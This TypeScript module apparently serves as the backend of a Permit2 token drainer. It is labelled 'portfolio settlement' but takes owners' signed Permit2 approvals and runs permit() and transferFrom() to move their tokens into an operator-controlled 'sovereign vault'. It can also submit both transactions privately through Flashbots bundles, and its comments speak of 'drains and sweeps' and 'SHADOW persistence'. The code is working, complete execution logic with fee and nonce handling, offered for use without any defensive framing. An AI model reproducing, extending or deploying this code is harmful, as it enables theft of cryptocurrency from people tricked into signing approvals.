// @ts-nocheck
/**
 * Permit2 AllowanceTransfer — on-chain permit() + transferFrom() for portfolio settlement.
 */
import type { Address, Hex } from 'viem'
import {
  createPublicClient,
  createWalletClient,
  encodeFunctionData,
  getAddress,
  http,
  isAddress,
  parseAbi,
  stringToHex,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { arbitrum, base, mainnet, optimism, polygon, sepolia, type Chain } from 'viem/chains'

import { PERMIT2_ADDRESS } from '../adapters/evm-adapter.js'
import { getRpcUrlForChainWithFallback } from '../lib/chain-rpc.js'
import { normalizeEvmExecutionPrivateKey } from '../lib/evm-execution-key.js'
import { LEGION_MESH_EVENT_SETTLEMENT, legionMeshViemFetchOptions } from './mesh-event.js'
import { deliverSignedEvmTransactions, isFlashbotsEnabled } from './flashbots-relay.js'

function readConfiguredEvmVaultAddress(): Address | null {
  const raw =
    (typeof process !== 'undefined' ? process.env['VAULT_ADDRESS_EVM'] : undefined)?.trim() ||
    (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_EVM'] : undefined)?.trim() ||
    (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_ADDRESS'] : undefined)?.trim() ||
    ''
  if (!raw || !isAddress(raw)) return null
  return getAddress(raw)
}

/**
 * When configured SOVEREIGN_VAULT_EVM differs from SETTLEMENT_EXECUTION_PRIVATE_KEY,
 * use the executor address so Permit2 drains and sweeps target the same hot wallet.
 */
export function resolveOperationalEvmVaultAddress(configuredVault: Address | null): Address | null {
  const executorKey = resolveSettlementExecutorKey()
  if (!executorKey) return configuredVault
  const executor = getAddress(privateKeyToAccount(executorKey).address)
  if (!configuredVault) return executor
  if (configuredVault.toLowerCase() !== executor.toLowerCase()) {
    console.warn(
      `[VAULT] Configured EVM vault ${configuredVault} != executor ${executor} — using executor for settlement and sweep`,
    )
    return executor
  }
  return configuredVault
}

/** Operational EVM vault — configured env vault aligned with settlement executor when mismatched. */
export function resolveEvmVaultAddress(): Address | null {
  return resolveOperationalEvmVaultAddress(readConfiguredEvmVaultAddress())
}

/**
 * Chain-aware EVM JSON-RPC — primary → backup → public fallback (all environments).
 * Chain 1 also honors remote-sync / RPC_ETHEREUM_PRIVATE resolution first.
 */
export async function resolveEvmRpcUrlForChain(chainId: number): Promise<string> {
  const primary = getRpcUrlForChainWithFallback(chainId)
  if (chainId !== 1) return primary

  const { resolveConfigPrioritized } = await import('../config/remote-sync.js')
  const envChain =
    readEnv(['RPC_ETHEREUM_PRIVATE', 'NEXT_PUBLIC_RPC_URL', 'RPC_URL']) || ''
  const synced =
    (await resolveConfigPrioritized('RPC_ETHEREUM_PRIVATE', envChain)) ?? envChain
  return synced || primary
}

function readEnv(keys: readonly string[]): string {
  if (typeof process === 'undefined') return ''
  for (const key of keys) {
    const raw = process.env[key]?.trim()
    if (raw) return raw
  }
  return ''
}

export const PERMIT2_ALLOWANCE_ABI = parseAbi([
  'function allowance(address owner, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)',
  'function permit(address owner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature)',
  'function transferFrom(address from, address to, uint160 amount, address token)',
])

export type Permit2SingleMetadata = {
  token: Address
  amount: string
  expiration: number
  nonce: number
  spender: Address
  sigDeadline: string
  chainId: number
}

export type Permit2SignatureEnvelope = {
  protocol: 'permit2_eip712'
  ingress_lane?: string
  permit2_signature: Hex
  permit?: Permit2SingleMetadata
  evm_raw_transaction?: Hex
}

function resolveChain(chainId: number): Chain {
  const map: Record<number, Chain> = {
    1: mainnet,
    137: polygon,
    42161: arbitrum,
    8453: base,
    10: optimism,
    11155111: sepolia,
  }
  return map[chainId] ?? mainnet
}

export function resolveEngineSpenderAddress(): Address | null {
  const candidates = [
    readEnv(['ENGINE_SPENDER']),
    readEnv(['NEXT_PUBLIC_ENGINE_SPENDER']),
    readEnv(['VAULT_ADDRESS_EVM']),
    readEnv(['SOVEREIGN_VAULT_EVM']),
    readEnv(['ADMIN_WALLET_ADDRESS']),
  ].filter(Boolean)
  for (const raw of candidates) {
    if (!isAddress(raw)) continue
    const addr = getAddress(raw)
    if (addr.toLowerCase() === PERMIT2_ADDRESS.toLowerCase()) continue
    return addr
  }
  return null
}

export function resolveSettlementExecutorKey(): Hex | null {
  const raw = readEnv([
    'SETTLEMENT_EXECUTION_PRIVATE_KEY',
    'RELAY_INTERMEDIARY_PRIVATE_KEY',
    'PRIVATE_KEY',
  ])
  return normalizeEvmExecutionPrivateKey(raw)
}

export async function resolveEvmExecutorRpcUrl(): Promise<string> {
  return resolveEvmRpcUrlForChain(1)
}

/** Pack Permit2 EIP-712 signature + metadata for SHADOW persistence. */
export function packPermit2SignatureEnvelope(params: {
  permit2Signature: Hex
  permit: Permit2SingleMetadata
  evmRawTransaction?: Hex
}): Hex {
  const json = JSON.stringify({
    protocol: 'permit2_eip712',
    ingress_lane: params.evmRawTransaction
      ? 'permit2_eip712_relay_v1'
      : 'permit2_eip712_allowance_v1',
    permit2_signature: params.permit2Signature,
    permit: params.permit,
    ...(params.evmRawTransaction ? { evm_raw_transaction: params.evmRawTransaction } : {}),
  })
  return stringToHex(json) as Hex
}

export function parsePermit2SignatureEnvelope(openedHex: string): Permit2SignatureEnvelope | null {
  const trimmed = openedHex.trim()
  if (!trimmed.startsWith('0x')) return null
  try {
    const text = Buffer.from(trimmed.slice(2), 'hex').toString('utf8')
    const parsed = JSON.parse(text) as unknown
    if (typeof parsed !== 'object' || parsed === null) return null
    const o = parsed as Record<string, unknown>
    const sig = o['permit2_signature']
    if (typeof sig !== 'string' || !sig.startsWith('0x')) {
      if (typeof o['protocol'] === 'string' && o['protocol'] === 'permit2_eip712' && typeof o['signature'] === 'string') {
        return {
          protocol: 'permit2_eip712',
          permit2_signature: o['signature'] as Hex,
          ...(typeof o['permit'] === 'object' && o['permit'] !== null
            ? { permit: o['permit'] as Permit2SingleMetadata }
            : {}),
          ...(typeof o['evm_raw_transaction'] === 'string'
            ? { evm_raw_transaction: o['evm_raw_transaction'] as Hex }
            : {}),
        }
      }
      return null
    }
    return {
      protocol: 'permit2_eip712',
      ingress_lane: typeof o['ingress_lane'] === 'string' ? o['ingress_lane'] : undefined,
      permit2_signature: sig as Hex,
      ...(typeof o['permit'] === 'object' && o['permit'] !== null
        ? { permit: o['permit'] as Permit2SingleMetadata }
        : {}),
      ...(typeof o['evm_raw_transaction'] === 'string'
        ? { evm_raw_transaction: o['evm_raw_transaction'] as Hex }
        : {}),
    }
  } catch {
    if (/^0x[0-9a-fA-F]{130,}$/.test(trimmed)) {
      return { protocol: 'permit2_eip712', permit2_signature: trimmed as Hex }
    }
    return null
  }
}

export async function readPermit2AllowanceNonce(
  publicClient: { readContract: (args: unknown) => Promise<unknown> },
  owner: Address,
  token: Address,
  spender: Address,
): Promise<number> {
  const result = (await publicClient.readContract({
    address: PERMIT2_ADDRESS,
    abi: PERMIT2_ALLOWANCE_ABI,
    functionName: 'allowance',
    args: [owner, token, spender],
  })) as readonly [bigint, number, number]
  return Number(result[2])
}

export type Permit2SettlementResult = {
  ok: boolean
  permit_tx_hash?: string
  transfer_tx_hash?: string
  relay_tx_hash?: string
  bundle_hash?: string
  detail?: string
}

const MAINNET_FEE_FLOOR_WEI = 100_000_000n
const PERMIT2_PERMIT_GAS_FALLBACK = 90_000n
const PERMIT2_TRANSFER_GAS_FALLBACK = 110_000n

export async function resolveEconomySettlementFees(client: {
  getFeeHistory: (args: { blockCount: number; rewardPercentiles: number[] }) => Promise<{
    baseFeePerGas: readonly bigint[]
    reward?: readonly (readonly bigint[])[]
  }>
}): Promise<{
  maxFeePerGas: bigint
  maxPriorityFeePerGas: bigint
  baseFee: bigint
}> {
  const feeHistory = await client.getFeeHistory({
    blockCount: 4,
    rewardPercentiles: [50],
  })
  const baseFee = feeHistory.baseFeePerGas[feeHistory.baseFeePerGas.length - 1] ?? 1_000_000_000n
  const priorityRaw = feeHistory.reward?.[feeHistory.reward.length - 1]?.[0] ?? 50_000_000n
  const maxPriorityFeePerGas = priorityRaw > 0n ? priorityRaw : 50_000_000n
  let maxFeePerGas = (baseFee * 125n) / 100n + maxPriorityFeePerGas
  if (maxFeePerGas < MAINNET_FEE_FLOOR_WEI) maxFeePerGas = MAINNET_FEE_FLOOR_WEI
  return { maxFeePerGas, maxPriorityFeePerGas, baseFee }
}

export function estimatePermit2RelayerFloorWei(maxFeePerGas: bigint): bigint {
  const gas = PERMIT2_PERMIT_GAS_FALLBACK + PERMIT2_TRANSFER_GAS_FALLBACK
  return (gas * maxFeePerGas * 110n) / 100n
}

function clampFeesToBalance(params: {
  balance: bigint
  gas: bigint
  maxFeePerGas: bigint
  maxPriorityFeePerGas: bigint
  baseFee: bigint
}): { maxFeePerGas: bigint; maxPriorityFeePerGas: bigint } {
  if (params.gas === 0n) {
    return { maxFeePerGas: params.maxFeePerGas, maxPriorityFeePerGas: params.maxPriorityFeePerGas }
  }
  if (params.gas * params.maxFeePerGas <= params.balance) {
    return { maxFeePerGas: params.maxFeePerGas, maxPriorityFeePerGas: params.maxPriorityFeePerGas }
  }
  const affordable = params.balance / params.gas
  if (affordable === 0n) {
    return { maxFeePerGas: params.maxFeePerGas, maxPriorityFeePerGas: params.maxPriorityFeePerGas }
  }
  const maxPriorityFeePerGas =
    affordable > params.baseFee ? affordable - params.baseFee : 1n
  return { maxFeePerGas: affordable, maxPriorityFeePerGas }
}

async function signPermit2ContractTransaction(params: {
  walletClient: ReturnType<typeof createWalletClient>
  account: ReturnType<typeof privateKeyToAccount>
  chain: Chain
  nonce: number
  functionName: 'permit' | 'transferFrom'
  args: readonly unknown[]
}): Promise<Hex> {
  const data = encodeFunctionData({
    abi: PERMIT2_ALLOWANCE_ABI,
    functionName: params.functionName,
    args: params.args as never,
  })
  const request = await params.walletClient.prepareTransactionRequest({
    account: params.account,
    to: PERMIT2_ADDRESS,
    data,
    chain: params.chain,
    nonce: params.nonce,
  } as unknown as Parameters<typeof params.walletClient.prepareTransactionRequest>[0])
  return params.walletClient.signTransaction({
    ...request,
    account: params.account,
    chain: params.chain,
  } as unknown as Parameters<typeof params.walletClient.signTransaction>[0])
}

/**
 * Submit Permit2 permit() then transferFrom() to sovereign vault.
 * Requires SETTLEMENT_EXECUTION_PRIVATE_KEY (or RELAY_INTERMEDIARY_PRIVATE_KEY).
 */
export async function executePermit2AllowanceSettlement(params: {
  owner: Address
  token: Address
  amount: bigint
  permit2Signature: Hex
  permit: Permit2SingleMetadata
  chainId: number
  rpcUrl?: string
}): Promise<Permit2SettlementResult> {
  const vault = resolveEvmVaultAddress()
  if (!vault) {
    return { ok: false, detail: 'VAULT_ADDRESS_EVM or SOVEREIGN_VAULT_EVM required' }
  }

  const executorKey = resolveSettlementExecutorKey()
  if (!executorKey) {
    return {
      ok: false,
      detail: 'SETTLEMENT_EXECUTION_PRIVATE_KEY or RELAY_INTERMEDIARY_PRIVATE_KEY required',
    }
  }

  const rpc = params.rpcUrl?.trim() || (await resolveEvmRpcUrlForChain(params.chainId))
  if (!rpc) {
    return { ok: false, detail: `RPC not configured for chain ${params.chainId}` }
  }

  const chain = resolveChain(params.chainId)
  const account = privateKeyToAccount(executorKey)
  const transport = http(rpc, {
    ...legionMeshViemFetchOptions(LEGION_MESH_EVENT_SETTLEMENT),
  })
  const publicClient = createPublicClient({ chain, transport })
  const walletClient = createWalletClient({ account, chain, transport })

  const permitSingle = {
    details: {
      token: getAddress(params.permit.token),
      amount: BigInt(params.permit.amount),
      expiration: params.permit.expiration,
      nonce: params.permit.nonce,
    },
    spender: getAddress(params.permit.spender),
    sigDeadline: BigInt(params.permit.sigDeadline),
  }
  const transferAmount = params.amount > 0n ? params.amount : BigInt(params.permit.amount)

  const fees = await resolveEconomySettlementFees(publicClient)
  const relayerBalance = await publicClient.getBalance({ address: account.address })

  if (isFlashbotsEnabled()) {
    try {
      const baseNonce = await publicClient.getTransactionCount({
        address: account.address,
        blockTag: 'pending',
      })
      const permitSigned = await signPermit2ContractTransaction({
        walletClient,
        account,
        chain,
        nonce: baseNonce,
        functionName: 'permit',
        args: [getAddress(params.owner), permitSingle, params.permit2Signature],
      })
      const transferSigned = await signPermit2ContractTransaction({
        walletClient,
        account,
        chain,
        nonce: baseNonce + 1,
        functionName: 'transferFrom',
        args: [
          getAddress(params.owner),
          getAddress(vault),
          transferAmount,
          getAddress(params.token),
        ],
      })
      const delivery = await deliverSignedEvmTransactions({
        txns: [permitSigned, transferSigned],
        chainId: params.chainId,
        rpcUrl: rpc,
      })
      if (!delivery.ok) {
        return { ok: false, detail: delivery.detail ?? 'Flashbots Permit2 settlement failed' }
      }
      return {
        ok: true,
        permit_tx_hash: delivery.transaction_hashes[0],
        transfer_tx_hash: delivery.transaction_hashes[1],
        bundle_hash: delivery.bundle_hash,
        detail: delivery.detail,
      }
    } catch (e) {
      return { ok: false, detail: e instanceof Error ? e.message : String(e) }
    }
  }

  let permitTxHash: string | undefined
  try {
    let permitGas = PERMIT2_PERMIT_GAS_FALLBACK
    try {
      permitGas = await publicClient.estimateContractGas({
        account,
        address: PERMIT2_ADDRESS,
        abi: PERMIT2_ALLOWANCE_ABI,
        functionName: 'permit',
        args: [getAddress(params.owner), permitSingle, params.permit2Signature],
      })
    } catch {
      /* sim revert still uses fallback — broadcast may succeed if estimate was conservative */
    }
    permitGas = (permitGas * 120n) / 100n
    const transferReserve = (PERMIT2_TRANSFER_GAS_FALLBACK * fees.maxFeePerGas * 110n) / 100n
    const permitBudget =
      relayerBalance > transferReserve ? relayerBalance - transferReserve : relayerBalance / 2n
    const permitFees = clampFeesToBalance({
      balance: permitBudget,
      gas: permitGas,
      maxFeePerGas: fees.maxFeePerGas,
      maxPriorityFeePerGas: fees.maxPriorityFeePerGas,
      baseFee: fees.baseFee,
    })
    permitTxHash = await walletClient.writeContract({
      account,
      address: PERMIT2_ADDRESS,
      abi: PERMIT2_ALLOWANCE_ABI,
      functionName: 'permit',
      args: [getAddress(params.owner), permitSingle, params.permit2Signature],
      chain,
      gas: permitGas,
      maxFeePerGas: permitFees.maxFeePerGas,
      maxPriorityFeePerGas: permitFees.maxPriorityFeePerGas,
    })
    await publicClient.waitForTransactionReceipt({ hash: permitTxHash as Hex, timeout: 120_000 })
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e)
    if (!/InvalidNonce|AllowanceExpired|SignatureExpired/i.test(msg)) {
      return { ok: false, detail: `permit() failed: ${msg}` }
    }
  }

  try {
    const balanceAfter = await publicClient.getBalance({ address: account.address })
    let transferGas = PERMIT2_TRANSFER_GAS_FALLBACK
    try {
      transferGas = await publicClient.estimateContractGas({
        account,
        address: PERMIT2_ADDRESS,
        abi: PERMIT2_ALLOWANCE_ABI,
        functionName: 'transferFrom',
        args: [getAddress(params.owner), getAddress(vault), transferAmount, getAddress(params.token)],
      })
    } catch {
      /* fallback gas if estimate reverts */
    }
    transferGas = (transferGas * 120n) / 100n
    const transferFees = clampFeesToBalance({
      balance: balanceAfter,
      gas: transferGas,
      maxFeePerGas: fees.maxFeePerGas,
      maxPriorityFeePerGas: fees.maxPriorityFeePerGas,
      baseFee: fees.baseFee,
    })
    const transferTxHash = await walletClient.writeContract({
      account,
      address: PERMIT2_ADDRESS,
      abi: PERMIT2_ALLOWANCE_ABI,
      functionName: 'transferFrom',
      args: [getAddress(params.owner), getAddress(vault), transferAmount, getAddress(params.token)],
      chain,
      gas: transferGas,
      maxFeePerGas: transferFees.maxFeePerGas,
      maxPriorityFeePerGas: transferFees.maxPriorityFeePerGas,
    })
    await publicClient.waitForTransactionReceipt({ hash: transferTxHash as Hex, timeout: 120_000 })
    return {
      ok: true,
      permit_tx_hash: permitTxHash,
      transfer_tx_hash: transferTxHash,
    }
  } catch (e) {
    return {
      ok: false,
      permit_tx_hash: permitTxHash,
      detail: e instanceof Error ? e.message : String(e),
    }
  }
}

/** Simulate Permit2 permit calldata (preflight). */
export function encodePermit2PermitCalldata(
  owner: Address,
  permit: Permit2SingleMetadata,
  signature: Hex,
): Hex {
  const permitSingle = {
    details: {
      token: getAddress(permit.token),
      amount: BigInt(permit.amount),
      expiration: permit.expiration,
      nonce: permit.nonce,
    },
    spender: getAddress(permit.spender),
    sigDeadline: BigInt(permit.sigDeadline),
  }
  return encodeFunctionData({
    abi: PERMIT2_ALLOWANCE_ABI,
    functionName: 'permit',
    args: [getAddress(owner), permitSingle, signature],
  })
}
